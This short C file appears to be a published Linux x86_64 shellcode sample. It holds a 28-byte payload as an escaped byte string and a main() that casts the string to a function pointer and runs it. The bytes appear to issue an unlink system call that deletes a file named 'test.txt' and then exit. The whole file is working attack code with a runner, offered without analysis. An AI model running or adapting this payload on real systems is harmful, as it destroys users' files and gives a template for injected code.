
//Architecture: Linux x86_64
//Shellcode Length:  28 bytes



#include <stdio.h>
#include <string.h>

char sh[]="\xeb\x0d\x6a\x57\x58\x5f\x0f\x05\x48"
          "\x31\xc0\xb0\x3c\x0f\x05\xe8\xee\xff"
          "\xff\xff\x74\x65\x73\x74\x2e\x74\x78\x74";


void main(int argc, char **argv)
{
        printf("Shellcode Length: %d\n", strlen (sh));
        int (*func)();
        func = (int (*)()) sh;
        (int)(*func)();
}

